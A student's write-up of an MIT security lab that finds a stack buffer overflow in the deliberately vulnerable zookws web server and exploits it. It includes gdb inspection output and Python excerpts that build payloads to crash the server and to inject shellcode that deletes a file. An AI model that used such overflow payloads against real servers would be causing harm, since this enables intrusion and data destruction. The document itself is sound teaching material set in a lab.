# Cybersecurity Exam Demo: Buffer Overflow Exploitation on Vulnerable x86-64 Systems

## Introduction
In the following demo I will execute a remote code injection attack based on the [_Lab 1 of MIT 6.566: Computer Systems Security_](https://css.csail.mit.edu/6.5660/2026/labs/lab1.html) course. The complete lab is made of 4 parts, we will solve the first 2 in this demo.

The objective of this demo is to inspect a vulnerable web-server (zookws) running on a x64 linux machine, find a buffer overflow vulnerability and then exploit it causing first the crash of the server and secondly execute a code injection.

### VM and vulnerable web server
For the setup I relied on the instructions provided by the Lab1 guide, I ran the _6.566-standalone-v26_ virtual machine on UTM on MacOS virtualizing the x64 aarch needed for the lab. Inside the virtual machine I cloned the official repository from https://github.com/mit-pdos/6.566-lab-2026 which contains:

* the zookd vulnerable server, composed of `http.c` and `zookd.c`
* some files to help the exploitation of the web-server like `exploit-template.py` and `shellcode.S`.
* some scripts to help running the programs with the same addresses and to check if exploitations have been successful.

### Mitigation removals
It is important to note that the server's executable and the virtual machine are set up to remove the security protections that would otherwise make a buffer overflow difficult to exploit. Specifically:

* the `zookd-exstack` program has been compiled with `-fno-stack-protector` to disable the stack canary mitigation and with `-z execstack` to allow the execution of code from the stack.
* ASLR is disabled using the `setarch -R` command

These configurations are implemented from the Lab creators within the `Makefile` and the `clean_env.sh` script to ensure a predictable and exploitable environment for the lab

### Threat Model
In this threat model, the attacker/adversary:
* has the server code available for inspection 
* is aware of the buffer overflow vulnerabilities
* has the capabilities for writing an exploit
* can interact with a vulnerable instance of the software

## Part 0 - Vulnerability discovery
The first step of the lab is to analyze the codebase and find some vulnerable buffers. I started from the `zookd.c - main()` function and after inspection of the code flow, the first vulnerable buffer has been:
```c
static void process_client(int fd) {
    ...
    char reqpath[4096];
    ...
}
```
which is a buffer placed on the stack. The vulnerability becomes clear once one follows the code into the `http_request_line()` and `url_decode()` functions. 

The way the web server is implemented reads an HTTP req (`GET /index.html HTTP/1.1`) from a socket up to 8192 bytes (`http.c` line 66), but subsequently `url_decode`, blindly copies the request path (`/index.html`) part of that netowrk input onto the reqpath buffer, under the implicit assumption that provided input will never exceed the buffer capacity, without any boundary checks. 

This allows an adversary to carefully construct an input that exceeds the buffer size and overwrites the stack, resulting in a stack buffer overflow.

## Part 1 - Make Zookws Crash
As first step to exploit the discovered buffer overflow vulnerability there is the need to inspect the running program with its memory and the stack composition in order to obtain the memory addresses.

As a tool to inspect the program I used `gdb`, a debugger for C/C++ already present on the virtual machine.

### Part 1 - Inspection
I started by launching gdb on the compiled program `zookd-exstack`

```sh
$ ./clean-env.sh gdb ./zookd-exstack
```
and setting a breakpoint after the call of the function of interest
```sh
(gdb) break process_client
Breakpoint 1 at 0x2b37: file zookd.c, line 123.
```

Now the following command is needed to attach gdb to the child processes of the server that will be forked when a connection will be accepted from the server
```sh
(gdb) set follow-fork-mode child
```
and finally we can run our server on port 8080 with
```sh
(gdb) run 8080
```
Next step is to initiate a connection to our server with the help of `curl` command from another terminal and to inspect the stack frame at the breakpoint:
```sh
(gdb) backtrace
#0  process_client (fd=4) at zookd.c:123
#1  0x0000555555556aff in run_server (port=0x7fffffffefa0 "8080") at zookd.c:104
#2  0x00005555555567e7 in main (argc=2, argv=0x7fffffffedb8) at zookd.c:33
```

We can now inspect more in depth the stack frame of the `process_client` function:

```sh
(gdb) info frame
Stack level 0, frame at 0x7fffffffebb0:
 rip = 0x555555556b37 in process_client (zookd.c:123); saved rip = 0x555555556aff
 called by frame at 0x7fffffffec80
 source language c.
 Arglist at 0x7fffffffeba0, args: fd=4
 Locals at 0x7fffffffeba0, Previous frame's sp is 0x7fffffffebb0
 Saved registers:
  rbp at 0x7fffffffeba0, rip at 0x7fffffffeba8
```
and finally find the memory address of `reqpath[0]`:
```sh
(gdb) print &reqpath
$1 = (char (*)[4096]) 0x7fffffffdb90
```

From this we can gather an important information: the instruction pointer register (`%rip`) is located at memory address `0x7fffffffeba8` and contains the address of the next instruction which is `0x555555556aff`.

A visual of the stack and the information we got is int the following visualization:
![Visualization of the Stack Frame](imgs/stack-content.png)

### Part 1 - Exploit
The goal of the first exercise is to make the web server crash. To do so, simply overwriting the return address value with a random value should be enough to make the CPU point to an invalid memory region and cause the server to terminate with some unexpected behavior.

The idea of the exploit is to use the information we have on memory addresses to construct an HTTP request that will carry the payload inside the request path. In this first part we will use a string composed of all As as simple sequence of bytes that will overwrite the buffer `reqpath` and the subsequent saved `rip`.

A template for the exploit is already provided in the repo, with a python script that issues an HTTP request, my additions was to include in the code the memory addresses found in the previous step and to edit the request to inclued in the path url the payload as follows:

```python
...

stack_buffer = 0x7fffffffdb90
stack_retaddr = 0x7fffffffeba8

def build_exploit(shellcode: bytes) -> bytes:

    payload = b"A"*(stack_retaddr - stack_buffer)
    req =   b"GET /" + urllib.parse.quote_from_bytes(payload).encode('ascii') + b" HTTP/1.0\r\n\r\n"
    
    return req

...
```
_[The complete code for this exploit is available in the repo as `code/exploit-2.py`]_

Then by running the server with `./clean-env.sh ./zookd-exstack 8080` and executing the automated script provided by the MIT for the evaluation we get the expected result!

![First exercise pass!](imgs/ex1-pass.png)
![The sent payload](imgs/ex1-payload.png)

## Part 2 - Code Injection
For the second part the goal is to use the same vulnerability to delete a file (`/home/student/grades.txt`) by injecting a shellcode inside the memory of the process exploiting the HTTP request.

The exploit here is similar to the first one since we are trying to exploit the same vulnerability, with the additional shellcode and a more careful ovewrite of the return address injected in the payload.

The challenging part of this second exercise is to write the shellcode direclty in x64 ASM instructions. Fortunately int the source https://thesquareplanet.com/blog/smashing-the-stack-21st-century/ there is a well explained blogpost with a shellcode very similar to the one we have to write, except for the syscall we would like to use and the registry loading.

Here the steps to generate the new exploit were:
1. Edit `shellcode.S`, and test the correctness locally with 
```sh
$ touch /home/student/grades.txt
$ make
$ ./run-shellcode shellcode.bin
```
and to verify that the file `grades.txt` is effectively removed. The complete shellcode is available in the repo as `code/shellcode.S`.

2. Implement the shellcode into the previous exploit script to take into consideration its position on the stack, padding with some bytes the remaining buffer space and overwrite the correct memory location of the saved rip with the starting address of our shellcode.

```python
...

padding_len = stack_retaddr - stack_buffer - 1 # Subtract 1 because the server expects a '/' at the start of reqpath in http_request_line

def build_exploit(shellcode: bytes) -> bytes:
    target_addr_jmp = stack_buffer + 1

    payload = shellcode
    payload += b"A" * (padding_len - len(shellcode))
    payload += struct.pack("<Q", target_addr_jmp) # returns the 8-byte binary encoding of the 64-bit integer target_addr_jmp
    
    encoded_payload = urllib.parse.quote_from_bytes(payload).encode('ascii')
    
    req = b"GET /" + encoded_payload + b" HTTP/1.0\r\n\r\n"
    
    return req

...
```
_[The complete code for this exploit is available in the repo as `code/exploit-4.py`]_

3. Start the web-server and execute the exploit issuing the malicoius request.


By inspecting the process' memory we can see the result of our the payload injection:
![Buffer contains the shellcode](imgs/ex2-injected-shellcode.png)

Now as assessment of the correctness of the vulnerability eploitation we can execute the second script, as shown in the following image, where we can both see that our exploit received a PASS and that the file `grades.txt` have been deleted.

![Pass of exercise 2](imgs/ex2-pass.png)

## Sources

- MIT 6.566, _Lab 1_ - [css.csail.mit.edu](https://css.csail.mit.edu/6.5660/2026/labs/lab1.html)
- Smashing the stack in the 21st century - [thesquareplanet.com](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
- Smashing the stack for fun and profit - [phrack.org](https://phrack.org/issues/49/14#article)
- Stack frame layout on x86_x64 - [eli.thegreenplace.net](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
- Linux System Call Table for x86_64 - [blog.rchapman.org](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

## AI usage disclosure
Large Language Models (LLMs) were used in the context of this lab to assist in understanding various parts of the server code, correcting minor syntax errors in the Python exploit development process, and improving my understanding of x86-64 assembly language concepts and register usage. Additionally, some portions of the text in this report were revised with the assistance of LLMs to improve clarity, readability, and grammatical correctness.

I declare that all work presented in this report was carried out by me. All ideas, analyses, conclusions, and any remaining errors are my sole responsibility.